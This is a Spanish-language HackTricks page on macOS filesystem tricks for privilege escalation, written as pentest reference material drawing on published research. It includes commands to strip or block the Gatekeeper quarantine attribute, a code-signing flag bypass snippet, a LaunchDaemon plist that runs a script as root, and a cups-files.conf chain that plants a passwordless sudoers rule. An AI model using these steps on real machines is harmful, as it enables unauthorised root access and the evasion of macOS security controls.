# Trucos de FS de macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Combinaciones de permisos POSIX

Para un **directorio**, los tres bits de permisos significan algo diferente de lo que significan en un archivo normal. `chmod(1)` denomina "**search**" al bit de ejecución cuando se aplica a un directorio:<sup>[[2]](#references)</sup>

> `0100` Para archivos, permite la ejecución por parte del propietario. Para directorios, permite al propietario hacer **search** en el directorio.

- **read** - puedes **enumerar** las entradas del directorio (listar los nombres).
- **write** - puedes **crear, renombrar y eliminar entradas** en el directorio. Ten en cuenta que esto es una propiedad del directorio *contenedor*, no del archivo: puedes eliminar un archivo que no puedes leer ni escribir, siempre que puedas escribir en su directorio padre.
- Para eliminar un **subdirectorio**, este debe estar vacío, lo que a su vez requiere suficientes permisos para eliminar todo lo que contiene.
- Si el directorio tiene el **sticky bit** (`S_ISVTX`, como `/tmp`), esto está restringido: POSIX establece que un proceso solo puede eliminar o renombrar archivos en él si es propietario del archivo, propietario del directorio o tiene los privilegios apropiados.<sup>[[1]](#references)</sup>
- **execute / search** - tienes **permitido atravesar** el directorio. La resolución de nombres de ruta localiza cada componente "en el directorio especificado por su predecesor", por lo que **perder los permisos de search en cualquier componente individual del prefijo de la ruta hace que todo lo que se encuentre debajo sea inalcanzable por ruta**, incluso si el archivo final es legible por cualquier usuario.<sup>[[1]](#references)</sup>

### Combinaciones peligrosas

**Cómo sobrescribir un archivo/carpeta propiedad de root**, pero:

- Un **propietario del directorio** padre en la ruta es el usuario
- Un **propietario del directorio** padre en la ruta es un **grupo de usuarios** con **write access**
- Un **grupo** de usuarios tiene acceso de **write** al **archivo**

Con cualquiera de las combinaciones anteriores, un atacante podría **inyectar** un **sym/hard link** en la ruta esperada para obtener una escritura arbitraria privilegiada.

### Caso especial de una carpeta root con R+X

Esto se deriva directamente de la regla de resolución de nombres de ruta anterior. Si un **directorio solo concede R+X a root**, los archivos que contiene son inalcanzables *por ruta* para todos los demás, pero los bits de permisos propios de los **archivos** aún pueden ser permisivos. El directorio es lo único que se interpone.

Por tanto, cualquier primitive que permita sacar el archivo de ese directorio —un proceso privilegiado que **mueva/renombre/copie** una ruta elegida por el atacante a una ubicación que puedas atravesar— se convierte en una lectura arbitraria, sin necesidad de superar nunca el propio modo del archivo:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Busca privileged file movers (installers, log rotators, crash/diagnostic collectors, backup y funciones de "export") que acepten un source path de un usuario con menos privilegios.

## Symbolic Link / Hard Link

### Archivo/carpeta permisivos

Si un proceso con privilegios escribe datos en un **archivo** que podría estar **controlado** por un **usuario con menos privilegios**, o que podría haber sido **creado previamente** por un usuario con menos privilegios. El usuario podría simplemente **apuntarlo a otro archivo** mediante un Symbolic o Hard link, y el proceso con privilegios escribirá en ese archivo.

Revisa las otras secciones donde un atacante podría **abusar de una escritura arbitraria para escalar privilegios**.

### Open `O_NOFOLLOW`

Según [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Solo se comprueba el componente **final**; todos los componentes **intermedios** aún se resuelven y siguen. Por lo tanto, un desarrollador que haya "protegido" una escritura con `O_NOFOLLOW` todavía puede ser atacado colocando un symlink en cualquier **directorio padre** de la ruta objetivo.<sup>[[3]](#references)</sup>

La misma página del manual documenta los flags que realmente cierran esa brecha:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

De lo contrario, `openat()` relativo a un directory FD que ya hayas validado, o `realpath()` + una revalidación, son las formas restantes de detener los cambios de symlink en la ruta intermedia.

## .fileloc

Los archivos con extensión **`.fileloc`** pueden apuntar a otras aplicaciones o binaries, de modo que, cuando se abren, se ejecutará la aplicación/binary indicado.\
Ejemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Descriptores de archivo

### Leak FD (no `O_CLOEXEC`)

Si una llamada a `open` no incluye el flag `O_CLOEXEC`, el descriptor de archivo será heredado por el proceso hijo. Por tanto, si un proceso privilegiado abre un archivo privilegiado y ejecuta un proceso controlado por el atacante, el atacante **heredará el FD del archivo privilegiado**.

El ejemplo clásico es el **LPE de `DYLD_PRINT_TO_FILE` en OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` aceptaba `DYLD_PRINT_TO_FILE=/path` incluso en **binarios restringidos (suid root)**, porque esa variable concreta se analizaba fuera de `processDyldEnvironmentVariable()`.
- Ejecutaba `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, por lo que **creaba un archivo propiedad de root en una ruta arbitraria**.
- El FD **nunca se cerraba y no tenía el flag close-on-exec**, por lo que cada proceso hijo del binario suid heredaba un **FD escribible a un archivo propiedad de root**.
- Ejecutar, por ejemplo, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` y después leer el número del FD heredado en el proceso hijo permitía realizar escrituras arbitrarias en archivos propiedad de root; `fcntl(fd, F_SETFL, 0)` incluso eliminaba `O_APPEND` para permitir sobrescribir en lugar de añadir contenido.

El mismo patrón aparece siempre que un proceso privilegiado abre un archivo **antes de ejecutar mediante `exec` algo que controlas** (herramientas auxiliares, editores de estilo `crontab` invocados mediante `$EDITOR`, archivos de registro o depuración abiertos desde una ruta proporcionada mediante una variable de entorno...). Enumera los FDs heredados con:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Cualquier valor superior a `2` que apunte a un archivo que no puedas abrir por ti mismo es una primitiva de escritura arbitraria (o de lectura arbitraria).

## Evita los trucos con xattrs de quarantine

### Elimínalo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Si un archivo/carpeta tiene este atributo immutable, no será posible ponerle un xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Sistemas de archivos sin compatibilidad con xattr

No todos los sistemas de archivos que macOS puede montar almacenan **extended attributes** de forma nativa. HFS+ y APFS sí lo hacen; **FAT32, exFAT y la mayoría de los montajes NFS no**; macOS los emula escribiendo un archivo secundario **AppleDouble** llamado `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Esto es importante para la cuarentena, porque el xattr solo sobrevive si realmente puede escribirse **y leerse de nuevo** desde el mismo volumen:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Si el volumen se lee posteriormente desde una ruta que ignora el archivo complementario `._` (o el archivo complementario se elimina), el archivo llega **sin un flag de quarantine**; y una `.app` sin quarantine es suficiente para escapar del App Sandbox, como se explica en [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Esta ACL impide añadir `xattrs` al archivo
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

El formato de archivo **AppleDouble** copia un archivo, incluidos sus ACEs.

En el [**código fuente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) se puede ver que la representación de texto de la ACL almacenada dentro del xattr llamado **`com.apple.acl.text`** se establecerá como ACL en el archivo descomprimido. Por lo tanto, si comprimes una aplicación en un archivo zip con el formato de archivo **AppleDouble** y una ACL que impide escribir otros xattrs en ella... el xattr de cuarentena no se establecía en la aplicación descomprimida:

Consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) para obtener más información.<sup>[[6]](#references)</sup>

Para replicar esto, primero debemos obtener la cadena ACL correcta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Nota: incluso si esto funciona, el sandbox escribe primero el xattr de quarantine)

No es realmente necesario, pero lo dejo ahí por si acaso:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass de las comprobaciones de firma

### Bypass de las comprobaciones de platform binaries

Algunas comprobaciones de seguridad verifican si el binario es un **platform binary**, por ejemplo, para permitir la conexión a un servicio XPC. Sin embargo, como se muestra en https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, es posible hacer bypass de esta comprobación obteniendo un platform binary (como /bin/ls) e inyectando el exploit mediante dyld usando una variable de entorno `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass de los flags `CS_REQUIRE_LV` y `CS_FORCED_LV`

Es posible que un binario en ejecución modifique sus propios flags para hacer bypass de las comprobaciones con un código como el siguiente:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Los bundles contienen el archivo **`_CodeSignature/CodeResources`**, que contiene el **hash** de cada **archivo** del **bundle**. Ten en cuenta que el hash de CodeResources también está **incrustado en el ejecutable**, por lo que tampoco podemos modificarlo.

Sin embargo, hay algunos archivos cuya firma no se comprobará; estos tienen la clave `omit` en el plist, como:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es posible calcular la firma de un recurso desde la CLI con:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montar dmgs

Un usuario puede montar un dmg personalizado creado incluso sobre algunas carpetas existentes. Así es como se puede crear un paquete dmg personalizado con contenido personalizado:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalmente, macOS monta los discos comunicándose con el servicio Mach `com.apple.DiskArbitrarion.diskarbitrariond` (proporcionado por `/usr/libexec/diskarbitrationd`). Si se añade el parámetro `-d` al archivo plist de LaunchDaemons y se reinicia, almacenará los registros en `/var/log/diskarbitrationd.log`.\
Sin embargo, es posible utilizar herramientas como `hdik` y `hdiutil` para comunicarse directamente con el kext `com.apple.driver.DiskImages`.

## Escrituras arbitrarias

### Scripts sh periódicos

Si tu script pudiera interpretarse como un **shell script**, podrías sobrescribir el shell script **`/etc/periodic/daily/999.local`**, que se ejecutará cada día.

Puedes **simular** la ejecución de este script con: **`sudo periodic daily`**

### Daemons

Escribe un **LaunchDaemon** arbitrario como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist que ejecute un script arbitrario como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Genera únicamente el script `/Applications/Scripts/privesc.sh` con los **comandos** que quieras ejecutar como root.

### Archivo sudoers

Si tienes **arbitrary write**, podrías crear un archivo dentro de la carpeta **`/etc/sudoers.d/`** que te conceda privilegios de **sudo**.

### Archivos PATH

El archivo **`/etc/paths`** es uno de los principales lugares que configura la variable de entorno PATH. Debes ser root para sobrescribirlo, pero si un script de un **proceso privilegiado** ejecuta algún **comando sin la ruta completa**, podrías **hijack** dicho comando modificando este archivo.

También puedes escribir archivos en **`/etc/paths.d`** para cargar nuevas carpetas en la variable de entorno `PATH`.

### cups-files.conf

Esta técnica se utilizó en [este writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Crea el archivo `/etc/cups/cups-files.conf` con el siguiente contenido:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Esto creará el archivo `/etc/sudoers.d/lpe` con permisos 777. La basura adicional al final sirve para provocar la creación del error log.

A continuación, escribe en `/etc/sudoers.d/lpe` la configuración necesaria para escalar privilegios, como `%staff ALL=(ALL) NOPASSWD:ALL`.

Después, modifica de nuevo el archivo `/etc/cups/cups-files.conf`, indicando `LogFilePerm 700`, para que el nuevo archivo sudoers sea válido al invocar `cupsctl`.

### Escape del Sandbox

Es posible escapar del macOS sandbox mediante un FS arbitrary write. Para ver algunos ejemplos, consulta la página [macOS Auto Start](../../../../macos-auto-start-locations.md), pero una técnica común consiste en escribir un archivo de preferencias de Terminal en `~/Library/Preferences/com.apple.Terminal.plist` que ejecute un comando al inicio y llamarlo mediante `open`.

## Generar archivos escribibles como otros usuarios

Un privesc primitive muy común consiste en hacer que un **privileged process cree un archivo por ti** en un directorio que controlas y, después, conservar el **write access** a ese archivo. Se necesitan dos elementos:

1. Un directorio que te pertenezca (o donde puedas establecer una **inheritable ACL**), de modo que todo lo que se cree dentro herede tus permisos.
2. Un proceso privilegiado/`suid` al que se le pueda indicar **dónde** crear un archivo, normalmente mediante una variable de entorno de debug/logging, un archivo de configuración o la API XPC de un helper.

La parte de la **inheritable ACL** es la que hace que el archivo creado sea escribible por ti, aunque pertenezca a otro usuario. Los flags de herencia `file_inherit` / `directory_inherit` están documentados en [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Ahora cualquier archivo que un proceso privilegiado cree dentro de `$DIRNAME` será **escribible por ti**. Si ese directorio también es una ubicación que posteriormente se **ejecuta como root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, un directorio de LaunchDaemon...), esto supone una escalada directa a root. Consulta las secciones [Sudoers File](#sudoers-file) y [cups-files.conf](#cups-filesconf) anteriores para saber qué escribir una vez que tengas el archivo.

Para ver un ejemplo completo de la cadena «una variable de entorno hace que un proceso root cree un archivo y el FD se filtra hasta ti», consulta [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) más arriba.

## Memoria compartida POSIX

La **memoria compartida POSIX** permite que los procesos de sistemas operativos compatibles con POSIX accedan a un área de memoria común, lo que facilita una comunicación más rápida en comparación con otros métodos de comunicación entre procesos. Esto implica crear o abrir un objeto de memoria compartida con `shm_open()`, establecer su tamaño con `ftruncate()` y mapearlo en el espacio de direcciones del proceso mediante `mmap()`. A continuación, los procesos pueden leer y escribir directamente en esta área de memoria. Para gestionar el acceso concurrente y evitar la corrupción de datos, suelen utilizarse mecanismos de sincronización como mutexes o semáforos. Finalmente, los procesos desmapean y cierran la memoria compartida con `munmap()` y `close()` y, opcionalmente, eliminan el objeto de memoria con `shm_unlink()`. Este sistema resulta especialmente eficaz para una IPC rápida y eficiente en entornos donde varios procesos necesitan acceder rápidamente a datos compartidos.

<details>

<summary>Ejemplo de código del Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Ejemplo de código de Consumer</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

Los **macOSCguarded descriptors** son una función de seguridad introducida en macOS para mejorar la seguridad y fiabilidad de las **operaciones con descriptores de archivo** en las aplicaciones de usuario. Estos descriptores protegidos permiten asociar restricciones específicas o "guards" a los descriptores de archivo, que son aplicadas por el kernel.

Esta función es especialmente útil para prevenir ciertas clases de vulnerabilidades de seguridad, como el **acceso no autorizado a archivos** o las **race conditions**. Estas vulnerabilidades ocurren cuando, por ejemplo, un thread accede a una descripción de archivo, dando **a otro thread vulnerable acceso a ella**, o cuando un descriptor de archivo es **heredado** por un proceso hijo vulnerable. Algunas funciones relacionadas con esta funcionalidad son:

- `guarded_open_np`: Abre un FD con un guard
- `guarded_close_np`: Lo cierra
- `change_fdguard_np`: Cambia los flags del guard en un descriptor (incluso eliminando la protección del guard)

## Referencias

- [1] [POSIX.1-2024 — Definiciones base, cap. 4 (Permisos de acceso a archivos, protección de directorios, resolución de nombres de ruta)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (bit de búsqueda/ejecución de directorios, flags de herencia de ACL)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (FD filtrado sin close-on-exec)
- [5] [The Eclectic Light Company - ¿Qué sistemas de archivos y servicios cloud conservan los atributos extendidos?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - El talón de Aquiles de Gatekeeper: descubriendo una vulnerabilidad de macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Una nueva era de los escapes del Sandbox de macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Descubriendo las vulnerabilidades de Apple: la auditoría de diskarbitrationd y storagekitd, parte 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
